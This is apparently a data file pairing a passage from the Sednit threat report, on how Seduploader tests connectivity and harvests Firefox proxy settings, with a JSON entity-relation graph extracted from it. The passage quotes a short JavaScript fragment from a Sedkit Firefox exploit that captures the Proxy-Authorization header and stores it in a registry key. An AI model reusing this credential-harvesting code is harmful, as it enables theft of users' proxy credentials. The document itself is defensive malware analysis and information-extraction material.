@@ -1,0 +1,84 @@
+
+
+
+Sentence : En Route with Sednit
+
+Direct Connection
+First, Seduploader simply sends an HTTP POST request to Google with a pseudo-randomly-generated
+URI path. If the HTTP status code in the answer is either 200 ~~(~~ ~~OK~~ ) or 404 ~~(Not Found)~~ — the most
+likely answer because there is little chance the pseudo-random URI path exists on Google
+websites — the network connection is assumed to be working. In this event, Seduploader
+initialization continues to the next step.
+
+On the other hand, if Seduploader receives a different HTTP status code, it means the connection
+has been blocked (and hence any later attempt to reach the C&C server will also likely be blocked).
+In this case, Seduploader tries an alternative method to establish the network link, as described
+in the next two sections.
+Before testing the connection, Seduploader checks if the computer has
+a working network interface. To do so, it searches for an interface with
+an IP address different from ~~127.0.0.1~~ and ~~169.254.155.178.~~ This second
+IP address belongs to IPv4 Link-Local network ~~169.254.0.0/16,~~ from which
+an address is randomly chosen by a computer failing to receive an IP address
+via DHCP protocol [75] . Therefore, it makes very little sense to check
+for a particular IP address in this network, as all addresses have the same
+probability of being chosen.
+
+Via Proxy
+Some organizations force their computers to pass through an HTTP proxy to access the Internet,
+which may explain why the previous direct connection did not work. To use the proxy, Seduploader
+needs to retrieve its IP address and TCP port number, plus some credentials, if needed.
+
+To retrieve this information, Seduploader searches for proxy configuration settings in the Firefox
+browser, via the two following steps:
+
+
+It parses the Firefox preference file ~~(~~ ~~pref.js~~ ~~)~~ to find the ~~network.proxy.http~~
+and ~~network.proxy.http_port felds~~ i, respectively, containing the proxy address and port
+number.
+
+
+It retrieves the proxy credentials from the custom Windows registry key ~~HKCU\Control~~
+~~Panel\Desktop\WeelScrInit.~~ Interestingly, this registry key was created during
+the exploitation of the target by Sedkit.
+
+
+For example, the following code snippet comes from a Sedkit exploit against Firefox
+(CVE-2014-1510 [37] ), and sets the registry key ~~WeelScrInit~~ to the value of the HTTP field ~~Proxy-~~
+~~Authorization~~, after a request has been made to download the payload. This HTTP field contains
+the credentials for proxy basic authentication, and can be reused for multiple requests [76] .
+~~var~~ channel = ioserv.newChannel("http:////[...REDACTED...]//cormac.mcr", 0, ~~null~~ );
+~~var~~ my_chan_host = channel.getRequestHeader("Proxy-Authorization");
+~~try~~ {
+~~var~~ wrk = Components.classes[ "@mozilla.org/windows-registry-
+key;1" ].createInstance(Components.interfaces.nsIWindowsRegKey);
+wrk.create(wrk.ROOT_KEY_CURRENT_USER, "Control Panel\\Desktop", wrk.ACCESS_
+WRITE);
+~~var~~ id = wrk.writeStringValue("WeelScrInit", my_chan_host);
+wrk.close();
+} ~~catch~~ (e) {}
+30
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Seduploader", "type" : "ACTO"},
+        {"id": 2, "description": "Google", "type" : "CCSH"},
+        {"id": 3, "description": "HTTP POST request", "type" : "NETP"},
+        {"id": 4, "description": "C&C server", "type" : "CCSH"},
+        {"id": 5, "description": "Firefox browser", "type" : "APPS"},
+        {"id": 6, "description": "pref.js (Firefox preference file)", "type" : "DOCF"},
+        {"id": 7, "description": "network.proxy.http and network.proxy.http_port fields", "type" : "REGI"},
+        {"id": 8, "description": "HKCU\\Control Panel\\Desktop\\WeelScrInit (Windows registry key)", "type" : "REGI"},
+        {"id": 9, "description": "CVE-2014-1510", "type" : "CVES"},
+        {"id": 10, "description": "Proxy-Authorization HTTP field", "type" : "TAMP"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "sends request to"},
+        {"source": 1, "target": 4, "rel_name" : "attempts to reach"},
+        {"source": 1, "target": 5, "rel_name" : "retrieves settings from"},
+        {"source": 1, "target": 6, "rel_name" : "parses file for information"},
+        {"source": 1, "target": 7, "rel_name" : "retrieves proxy configuration"},
+        {"source": 1, "target": 8, "rel_name" : "retrieves credentials from"},
+        {"source": 9, "target": 5, "rel_name" : "exploits vulnerability in"},
+        {"source": 10, "target": 4, "rel_name" : "contains proxy authentication"}
+    ]
+}
